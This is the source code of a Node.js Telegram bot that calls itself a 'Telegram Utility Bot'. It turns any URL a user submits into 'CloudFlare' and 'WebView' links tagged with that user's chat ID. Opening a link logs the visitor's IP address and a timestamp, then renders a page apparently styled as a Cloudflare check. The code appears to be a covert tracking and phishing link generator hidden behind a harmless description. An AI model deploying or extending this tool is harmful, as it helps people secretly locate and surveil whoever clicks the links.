const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");
const TelegramBot = require("node-telegram-bot-api");

const app = express();

const bot = new TelegramBot(process.env.BOT_TOKEN, {
  polling: true,
});

// =========================
// REQUIRED CHANNEL
// =========================

const CHANNEL_USERNAME = "@Digiwordls";
const CHANNEL_LINK = "https://t.me/Digiwordls";

// =========================
// MIDDLEWARE
// =========================

app.use(
  bodyParser.json({
    limit: "20mb",
  })
);

app.use(
  bodyParser.urlencoded({
    extended: true,
    limit: "20mb",
  })
);

app.set("view engine", "ejs");

// =========================
// HOST URL
// =========================

const hostURL = "https://your-render-url.onrender.com";

// =========================
// CHECK CHANNEL JOIN
// =========================

async function isJoined(userId) {
  try {
    const member = await bot.getChatMember(
      CHANNEL_USERNAME,
      userId
    );

    return (
      member.status === "member" ||
      member.status === "administrator" ||
      member.status === "creator"
    );
  } catch (err) {
    console.log(err);
    return false;
  }
}

// =========================
// START MENU
// =========================

async function sendStartMenu(chatId, firstName = "User", userId) {
  const joined = await isJoined(userId);

  // NOT JOINED
  if (!joined) {
    return bot.sendMessage(
      chatId,
      `⚠️ Please join our channel first to use this bot.`,
      {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "📢 Join Channel",
                url: CHANNEL_LINK,
              },
            ],
            [
              {
                text: "✅ Verify",
                callback_data: "verify_join",
              },
            ],
          ],
        },
      }
    );
  }

  // JOINED
  const menu = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🌐 Create Link", callback_data: "crenew" }],
        [{ text: "📖 Help", callback_data: "help" }],
        [{ text: "ℹ️ About", callback_data: "about" }],
      ],
    },
  };

  try {
    const photo = fs.createReadStream("./logo.png");

    bot.sendPhoto(chatId, photo, {
      caption: `
🔥 Welcome ${firstName}!

⚡ Telegram Utility Bot

━━━━━━━━━━━━━━
✅ Features
• Create custom links
• Web utilities
• URL management
━━━━━━━━━━━━━━

👇 Select an option below
`,
      parse_mode: "HTML",
      ...menu,
    });
  } catch {
    bot.sendMessage(
      chatId,
      `✅ Welcome ${firstName}!`,
      menu
    );
  }
}

// =========================
// CREATE LINK
// =========================

function createLink(cid, msg) {
  const encoded = [...msg].some(
    (char) => char.charCodeAt(0) > 127
  );

  if (
    (msg.toLowerCase().includes("http://") ||
      msg.toLowerCase().includes("https://")) &&
    !encoded
  ) {
    const url =
      cid.toString(36) + "/" + Buffer.from(msg).toString("base64");

    const menu = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "🌐 Create New Link",
              callback_data: "crenew",
            },
          ],
        ],
      },
    };

    bot.sendMessage(
      cid,
      `
✅ New links created successfully

🌍 URL:
${msg}

━━━━━━━━━━━━━━

☁️ CloudFlare Link
${hostURL}/c/${url}

🌐 WebView Link
${hostURL}/w/${url}

━━━━━━━━━━━━━━
`,
      menu
    );
  } else {
    bot.sendMessage(
      cid,
      `⚠️ Please enter a valid URL including http or https`
    );

    createNew(cid);
  }
}

// =========================
// CREATE NEW
// =========================

function createNew(cid) {
  const mk = {
    reply_markup: {
      force_reply: true,
    },
  };

  bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
}

// =========================
// BOT MESSAGES
// =========================

bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // FORCE CHANNEL JOIN
  const joined = await isJoined(userId);

  if (!joined && msg.text !== "/start") {
    return bot.sendMessage(
      chatId,
      `⚠️ You must join the channel first.`,
      {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "📢 Join Channel",
                url: CHANNEL_LINK,
              },
            ],
            [
              {
                text: "✅ Verify",
                callback_data: "verify_join",
              },
            ],
          ],
        },
      }
    );
  }

  // REPLY URL
  if (msg?.reply_to_message?.text === "🌐 Enter Your URL") {
    return createLink(chatId, msg.text);
  }

  // START
  if (msg.text === "/start") {
    return sendStartMenu(
      chatId,
      msg.chat.first_name,
      userId
    );
  }

  // CREATE
  if (msg.text === "/create") {
    return createNew(chatId);
  }

  // HELP
  if (msg.text === "/help") {
    return bot.sendMessage(
      chatId,
      `
📖 HOW TO USE

1️⃣ Send /create

2️⃣ Enter your target URL

3️⃣ Bot will generate links

━━━━━━━━━━━━━━

⚡ FEATURES
• URL Generator
• WebView Support
• Link Utility
`,
      {
        parse_mode: "HTML",
      }
    );
  }
});

// =========================
// CALLBACKS
// =========================

bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  const userId = query.from.id;

  bot.answerCallbackQuery(query.id);

  // VERIFY BUTTON
  if (query.data === "verify_join") {
    const joined = await isJoined(userId);

    if (!joined) {
      return bot.sendMessage(
        chatId,
        `❌ You still haven't joined the channel.`,
        {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "📢 Join Channel",
                  url: CHANNEL_LINK,
                },
              ],
            ],
          },
        }
      );
    }

    return sendStartMenu(
      chatId,
      query.from.first_name,
      userId
    );
  }

  // CREATE
  if (query.data === "crenew") {
    return createNew(chatId);
  }

  // HELP
  if (query.data === "help") {
    return bot.sendMessage(
      chatId,
      `
📖 HELP MENU

Send /create to generate a new link.

━━━━━━━━━━━━━━
⚡ FEATURES

• URL Generator
• WebView Links
• Utility Features
━━━━━━━━━━━━━━
`
    );
  }

  // ABOUT
  if (query.data === "about") {
    return bot.sendMessage(
      chatId,
      `
ℹ️ ABOUT BOT

⚙️ Built With:
• NodeJS
• Express
• Telegram Bot API

🚀 Hosted on Render
`
    );
  }
});

// =========================
// POLLING ERROR
// =========================

bot.on("polling_error", (error) => {
  console.log(error.code);
});

// =========================
// HOME
// =========================

app.get("/", (req, res) => {
  res.send("✅ Bot Running");
});

// =========================
// WEBVIEW
// =========================

app.get("/w/:path/:uri", (req, res) => {
  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.connection.remoteAddress ||
    req.ip;

  const d = new Date()
    .toJSON()
    .slice(0, 19)
    .replace("T", ":");

  if (req.params.path) {
    res.render("webview", {
      ip,
      time: d,
      url: Buffer.from(
        req.params.uri,
        "base64"
      ).toString(),
      uid: req.params.path,
    });
  } else {
    res.redirect("https://t.me/");
  }
});

// =========================
// CLOUDFLARE PAGE
// =========================

app.get("/c/:path/:uri", (req, res) => {
  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.connection.remoteAddress ||
    req.ip;

  const d = new Date()
    .toJSON()
    .slice(0, 19)
    .replace("T", ":");

  if (req.params.path) {
    res.render("cloudflare", {
      ip,
      time: d,
      url: Buffer.from(
        req.params.uri,
        "base64"
      ).toString(),
      uid: req.params.path,
    });
  } else {
    res.redirect("https://t.me/");
  }
});

// =========================
// SERVER
// =========================

const PORT = process.env.PORT || 5000;

app.listen(PORT, () => {
  console.log(`✅ Server Running On Port ${PORT}`);
});
